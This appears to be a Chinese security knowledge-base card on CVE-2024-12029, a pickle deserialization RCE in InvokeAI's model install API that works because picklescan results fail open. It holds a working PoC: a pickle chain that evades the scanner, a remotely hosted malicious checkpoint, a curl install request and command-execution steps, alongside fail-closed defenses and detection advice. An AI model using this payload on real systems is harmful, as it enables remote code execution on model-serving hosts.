---
id: ai-security-supply-chain-invokeai-model-install-picklescan-suspicious-fail-open-rce
title: InvokeAI /api/v2/models/install 外部 checkpoint 反序列化 RCE：picklescan Suspicious/扫描错误被 fail-open 放行（CVE-2024-12029）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: invokeai-model-install-picklescan-suspicious-fail-open-pickle-rce
tags:
- ai-supply-chain
- invokeai
- pickle
- deserialization
- torch
- picklescan
- rce
- model-install
- fail-open
- cve-2024-12029
cve:
- CVE-2024-12029
severity: critical
confidence: high
status: verified
affected_versions: 5.3.1 至 5.4.2（5.4.3rc2 及以上修复）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-05T23:11:14+08:00'
  notes: V104 指出图11 实为 scan_err=InvalidMagicError 而非 Suspicious；已改写为两种 fail-open 表现并存并重新 verify
url: /docs/ai-security/supply-chain/ai-security-supply-chain-invokeai-model-install-picklescan-suspicious-fail-open-rce/
draft: false
kb_aliases:
- CVE-2024-12029
- GHSA-mcrp-whpw-jp68
- InvokeAI 模型安装 RCE
- picklescan Suspicious 绕过
- infected_files=0 放行
- torch.load weights_only=False
- 外部 checkpoint 反序列化
- fail-open 扫描策略
---

## 一句话结论

InvokeAI 5.3.1 ~ 5.4.2 的 `/api/v2/models/install` 接受外部 URL 并自动下载 checkpoint，安装流程先用 picklescan 扫描、再 `torch.load` 加载；旧策略只在 `infected_files != 0` 时拒绝，而用三个仅被标记为 Suspicious 的全局（`__builtin__.__import__`、`__builtin__.vars`、`_operator.getitem`）动态拼出 `os.system` 的 pickle 链。原文正文称扫描结果为 `infected_files=0、scan_err=False、suspicious_count=3`；但原文图11 的复现实际显示 `scan_err=InvalidMagicError`（模拟扫描器无法解析旧格式）时业务仍继续 `torch.load`。无论 Suspicious 还是扫描错误，旧策略只看 `infected_files`，于是被当作“安全”加载，在服务进程权限下执行任意命令（CVE-2024-12029）。

## 原理

- **模型安装入口**：`/api/v2/models/install` 的 `source` 参数支持本地路径、Hugging Face repo_id 和 HTTP URL；`_guess_source()` 用 `^https?://` 识别 URL 并构造 `URLModelSource`，随后 `_import_from_url()` → `_remote_files_from_source()` → `_import_remote_model()` → `_multifile_download()` 把外部 checkpoint 拉进本地安装目录并提交下载队列。
- **扫描与加载的顺序**：`ModelProbe._scan_and_load_checkpoint()` 对 `.ckpt/.pt/.pth/.bin` 调用 `_scan_model()`（内部 `picklescan.scan_file_path`），然后无条件 `torch.load(model_path, map_location="cpu")`。旧代码只判断 `scan_result.infected_files != 0`；扫描结果实际有三种状态：
  - A. 扫描完成、未发现恶意全局：`infected_files=0, scan_err=False, suspicious_count=0`；
  - B. 扫描没有完成（无法解析/异常）：`infected_files=0, scan_err=True`；
  - C. 扫描完成、但命中全局只达到 Suspicious：`infected_files=0, scan_err=False, suspicious_count>0`。
  旧策略把 B、C 与 A 混为一谈：只要没有 reported infected file，就继续进入高能力反序列化器。
- **为什么 picklescan 只报 Suspicious**：picklescan 把 `exec`、`os.system`、`subprocess`、`builtins.getattr`、`operator.attrgetter` 等直接出现在 pickle `GLOBAL` 中的调用归为 Dangerous，会令 `infected_files` 增加；但 `__builtin__.__import__`、`__builtin__.vars`、`_operator.getitem` 只被归为 Suspicious。攻击者可以把最终 callable 拆成多个 REDUCE 动态恢复，避免任何 Dangerous 全局出现在文件里。
- **Payload 构造**：用一个可 pickle 的 `Call` thunk 包装函数与参数，`__reduce__` 返回 `(self.func, self.args)`。链为：
  - `Call(builtins.__import__, ("os",))` → 得到 os 模块；
  - `Call(builtins.vars, (os_module,))` → 得到 os 模块的 `__dict__`；
  - `Call(operator.getitem, (os_dict, "system"))` → 从字典取 `system`；
  - `Call(os_system, (cmd,))` → 顶层调用 `os.system(cmd)`。
  由于顶层 func 本身是上一层 REDUCE 的返回值，pickle 文件中的 GLOBAL 只有 `__builtin__.__import__`、`__builtin__.vars`、`_operator.getitem`，不会出现 `os.system`。
- **执行时机**：`torch.load` 在 torch 2.6 之前默认 `weights_only=False`，使用完整 pickle 语义；恢复对象时调用 `__reduce__` 返回的 callable，副作用发生在 checkpoint 反序列化阶段，不需要模型推理。原文环境为 InvokeAI 5.4.2 + picklescan 1.0.5 + PyTorch 2.4.1。
- **根因是策略 fail-open，而不是“没有扫描”**：扫描器给出了 Suspicious 结论，但业务只把 `infected_files` 当作准入条件；`scan_err` 与 `suspicious_count` 没有进入决策。原文用同一文件做对照：漏洞策略 `continue_to_torch_load` 并生成 marker；参考 fail-closed 策略 `reject_before_torch_load`，marker 不存在。
- **修复边界**：官方 diff 把条件改为 `infected_files != 0 or scan_err`，并把 `read_checkpoint_meta` 的默认扫描改为 True；但该条件仍未直接拒绝“`infected_files=0、scan_err=False、suspicious_count>0`”的状态 C。原文因此把 `reject any non-Innocuous global` 作为更严格的参考准入策略，并指出对官方修复版本仍需用相同样本做版本回归。通用原则：任何无法明确确认安全的扫描结果，都不应直接进入高能力反序列化器。

## 触发条件

- InvokeAI 5.3.1 ~ 5.4.2（5.4.3rc2+ 修复）。
- 运行环境 torch 2.6 以下（默认 `weights_only=False`）；原文实测 PyTorch 2.4.1。
- `/api/v2/models/install` 可从攻击者网络访问，且允许外部 HTTP URL 作为 `source`（默认行为；无需认证的描述见原文入口）。
- 服务进程能出网/回连攻击者的模型托管地址，或攻击者能提供可达 URL。
- 目标使用 picklescan 且版本/规则会把上述三个全局归为 Suspicious 而非 Dangerous；不同 picklescan 版本的分类可能变化，需按目标版本验证。
- 服务进程对安装目录可写；RCE 以该进程权限执行（原文为普通用户 chihiro，但可替换为反弹 shell/挖矿等）。
- 目标未在首次加载时做沙箱隔离，也未强制 `weights_only=True`。

## 利用步骤

1. **构造恶意 checkpoint**：实现 `Call` thunk（`__reduce__` 返回 `(func, args)`），按 `__import__('os') → vars(os) → os.__dict__['system'] → call(cmd)` 组装嵌套调用，用 `torch.save` 保存为 `.ckpt/.pt`。目的是让 pickle 中只出现 Suspicious 全局，不出现 Dangerous 全局。
2. **本地验证扫描结果**：用目标同版本 picklescan `scan_file_path` 检查样本，确认 `infected_files=0` 且 `scan_err=True` 或 `suspicious_count>0`（原文截图实际为 InvalidMagicError，正文另称 suspicious_count=3），两者都会进入 `torch.load`。
3. **托管样本**：把恶意 checkpoint 放到攻击者控制的 HTTP 服务（原文 `python -m http.server 8001`），确保目标可访问。
4. **提交安装请求**：`POST /api/v2/models/install?source=http%3A%2F%2F<host>%2Fevil.ckpt&inplace=false`，`Content-Type: application/json`，body 为 `{}`；响应中应看到 `source.url` 与 `status: waiting`。
5. **等待下载与安装**：服务日志出现 `Queueing model install`、`File download started`、`Download complete`、`Model install started`，随后进入扫描与 `torch.load`。
6. **验证副作用**：检查 marker 文件或反弹 shell；原文用 `echo CVE-2024-12029:$(whoami)@$(hostname) > /tmp/invokeai_pickle_marker.txt`，进一步用 `open -a Calculator` 弹出计算器证明 RCE。
7. **对照 fail-closed**：同一文件在参考策略下应在 `torch.load` 前被拒绝，marker 不出现；用于验证目标策略是否真正关闭了 fail-open 分支。

## PoC

恶意 checkpoint 构造（原文核心逻辑，简化）：

```python
import builtins
import operator
import torch

class Call:
    def __init__(self, func, args):
        self.func, self.args = func, args
    def __call__(self):
        ...
    def __reduce__(self):
        return (self.func, self.args)

def build_payload(cmd):
    os_module = Call(builtins.__import__, ("os",))
    os_dict   = Call(builtins.vars, (os_module,))
    os_system = Call(operator.getitem, (os_dict, "system"))
    return Call(os_system, (cmd,))

payload = {
    "state_dict": {},
    "metadata": build_payload(
        "echo CVE-2024-12029:$(whoami)@$(hostname) > /tmp/invokeai_pickle_marker.txt"
    ),
}
torch.save(payload, "/tmp/evil_legacy.ckpt")
```

pickle 反汇编应只出现 Suspicious 全局：

```text
GLOBAL __builtin__ __import__
GLOBAL __builtin__ vars
GLOBAL _operator getitem
REDUCE ...   # 逐层恢复 os.system 并最终调用
```

提交安装：

```bash
curl -sS -X POST \
  'http://127.0.0.1:9090/api/v2/models/install?source=http%3A%2F%2F127.0.0.1%3A8001%2Fevil_legacy.ckpt&inplace=false' \
  -H 'Content-Type: application/json' -d '{}'
```

原文正文称 picklescan 返回 `infected_files=0, scan_err=False, suspicious_count=3`，但图11 的复现实际显示 `scan_err=InvalidMagicError` 仍继续加载；两种结果都说明旧策略只以 `infected_files` 为准。漏洞策略 `continue_to_torch_load` 后 marker 内容为 `CVE-2024-12029:chihiro@chihirodeMacBook-Air.local`；参考 fail-closed 策略 `reject_before_torch_load`，marker 不存在。

## 变体与关联

- **扫描状态 B（scan_err）**：无法解析的 checkpoint 也可能 `infected_files=0`，旧策略同样放行；利用方式是构造 picklescan 解析失败的畸形 pickle/容器，再依赖 `torch.load` 的容错解析。
- **其他 Suspicious 组合**：除 `__import__/vars/getitem` 外，任何被扫描器归为低危的可调用对象都可作为搭建块；核心是“动态恢复 callable + 不出现 Dangerous 全局”。
- **其他模型安装入口/格式**：同类“下载→扫描→加载”链可出现在其他 AI 应用的模型管理 API；`.pt/.pth/.bin/.ckpt` 都可能走 pickle。Hugging Face 恶意模型 pickle 是同一原语的不同投递面。
- **torch 版本分水岭**：torch 2.6+ 默认 `weights_only=True`，完整 pickle 语义被限制，payload 在加载阶段被拦截；但“加载失败后自动回退 `weights_only=False`”的代码会重新打开风险。
- **修复对照**：官方 diff 加 `scan_err` 与默认扫描，但对 Suspicious-only 状态仍可能放行；更稳妥的是 fail-closed（拒绝任何非 Innocuous 全局）或直接改用安全格式/受限加载。
- **关联卡片**：[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（恶意模型 pickle 加载即 RCE 的通用投递面）、[[ai-security-supply-chain-safetensors-duplicate-key-audit-bypass]]（模型文件格式与扫描器语义差异导致的审计绕过）。

## 检测与防御

- **Fail-closed 准入**：`infected_files != 0`、`scan_err=True`、`suspicious_count>0` 或任何无法确认 Innocuous 的扫描结果都应拒绝进入 `torch.load`；不要把“没有 Dangerous”当作“安全”。
- **强制受限加载**：对不可信 checkpoint 使用 `torch.load(..., weights_only=True)` 或安全格式（safetensors）；禁止加载失败后自动回退到 `weights_only=False`。
- **首次加载隔离**：在一次性沙箱中完成首次加载，使用非 root 用户、无云凭据/SSH Key、默认阻断出站、只读根文件系统、不挂载 Docker Socket 与宿主敏感目录，并限制 CPU/内存/进程/时间。
- **入口与网络**：限制 `/api/v2/models/install` 的外部 URL 来源（域名白名单/仅可信模型仓库），对安装请求做认证与审计；不让模型服务直接访问任意公网 URL。
- **扫描器与加载器对齐**：确保扫描器覆盖加载器支持的全部对象/容器语法；对扫描器异常、版本差异、只支持部分结构的情况一律按不安全处理；定期用已知恶意样本回归测试。
- **监控与应急**：告警外部 URL 模型安装、picklescan `suspicious_count>0`、`torch.load` 的 `weights_only=False` 警告、安装后异常子进程/网络连接；发现后隔离主机、删除恶意 checkpoint、轮换服务凭据并检查持久化。
